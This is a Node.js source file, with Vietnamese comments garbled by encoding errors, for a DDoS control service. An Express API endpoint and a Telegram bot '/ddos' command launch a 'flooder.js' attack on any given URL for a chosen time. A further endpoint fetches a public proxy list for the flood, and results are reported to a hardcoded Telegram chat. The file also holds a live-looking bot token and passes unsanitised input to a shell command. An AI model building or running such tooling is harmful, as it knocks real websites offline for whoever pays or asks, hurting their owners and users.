const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Kh·ªüi t·∫°o bot Telegram v·ªõi token c·ªßa b·∫°n
const bot_token = "8152527907:AAFjtXCIPYHTErd9r8us8ScyvCydeL8y6nM"; // Thay b·∫±ng token bot c·ªßa b·∫°n
const chat_id = "-1002390662783"; // Thay b·∫±ng chat ID c·ªßa b·∫°n

const bot = new TelegramBot(bot_token, { polling: true });
const app = express();
const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;

app.use(express.json());

// H√†m g·ª≠i th√¥ng b√°o Telegram
const sendTelegramMessage = async (message) => {
    try {
        await bot.sendMessage(chat_id, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('L·ªói khi g·ª≠i tin nh·∫Øn Telegram:', error.message);
    }
};

// API endpoint ƒë·ªÉ nh·∫≠n y√™u c·∫ßu t·ª´ API client
app.get('/api', async (req, res) => {
    const field = {
        url: req.query.url || undefined,
        time: req.query.time || undefined,
        rate: req.query.rate || undefined,
        thea: req.query.thea || undefined,
        proxy: req.query.proxy || undefined,
        api_key: req.query.api_key || undefined,
    };

    // Ki·ªÉm tra API key v√† c√°c tham s·ªë
    if (field.api_key !== "quangdev") {
        return res.json({ status: 500, data: 'Kh√≥a API kh√¥ng h·ª£p l·ªá' });
    }

    if (!field.url || !urlRegex.test(field.url) || !field.time || isNaN(field.time)) {
        return res.json({ status: 400, message: "Tham s·ªë kh√¥ng h·ª£p l·ªá. D√πng: /api?url=<url>&time=<time>" });
    }

    // L·ªánh ƒë·ªÉ g·ªçi flooder.js
    const command = `node flooder.js ${field.url} ${field.time} 10 10 ${field.proxy}`;

    console.log(`API ƒëang th·ª±c hi·ªán DDoS URL: ${field.url} v·ªõi th·ªùi gian: ${field.time} gi√¢y`);

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`L·ªói khi th·ª±c hi·ªán: ${stderr}`);
            return res.json({ status: 500, message: "Th·ª±c thi th·∫•t b·∫°i" });
        }

        sendTelegramMessage(`*DDoS th√†nh c√¥ng!*\nüåê *Host*: ${field.url}\n‚è∞ *Time*: ${field.time} gi√¢y`);
        return res.json({ status: 200, message: "DDoS th√†nh c√¥ng!" });
    });
});

// L·∫Øng nghe c√°c l·ªánh t·ª´ bot Telegram
bot.onText(/\/ddos (.+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1]; // L·∫•y URL t·ª´ l·ªánh
    const time = match[2]; // L·∫•y th·ªùi gian t·ª´ l·ªánh

    if (!url || !urlRegex.test(url) || !time || isNaN(time)) {
        bot.sendMessage(chatId, "Tham s·ªë kh√¥ng h·ª£p l·ªá. D√πng: `/ddos <url> <time>`");
        return;
    }

    // G·ª≠i th√¥ng b√°o khi b·∫Øt ƒë·∫ßu t·∫•n c√¥ng DDoS
    const message = `*Bot ƒë√£ nh·∫≠n y√™u c·∫ßu DDoS!*\nüåê *Host*: ${url}\n‚è∞ *Time*: ${time} gi√¢y`;
    sendTelegramMessage(message);

    const command = `node flooder.js ${url} ${time} 10 10 proxies.txt`;

    // Th·ª±c thi l·ªánh DDoS
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Bot l·ªói khi th·ª±c hi·ªán: ${stderr}`);
            bot.sendMessage(chatId, "Th·ª±c thi th·∫•t b·∫°i!");
            return;
        }

        console.log(`K·∫øt qu·∫£ t·∫•n c√¥ng DDoS: ${stdout}`);
        bot.sendMessage(chatId, `*DDoS th√†nh c√¥ng!*:\nüåê *Host*: ${url}\n‚è∞ *Time*: ${time} gi√¢y\n\n${stdout}`);
    });
});

// API endpoint ƒë·ªÉ t·∫£i proxy t·ª± ƒë·ªông
app.get('/proxy', async (req, res) => {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`ƒê√£ t·∫£i t·ªáp proxy`);
        return res.json({ status: 200, message: "ƒê√£ t·∫£i proxy th√†nh c√¥ng" });
    } catch (error) {
        console.error(`L·ªói khi t·∫£i proxy: ${error.message}`);
        return res.json({ status: 500, message: "L·ªói khi t·∫£i proxy" });
    }
});

// Kh·ªüi ƒë·ªông server Express
const api_port = 4000;
app.listen(api_port, () => console.log(`API ƒë√£ ch·∫°y tr√™n c·ªïng ${api_port}`));
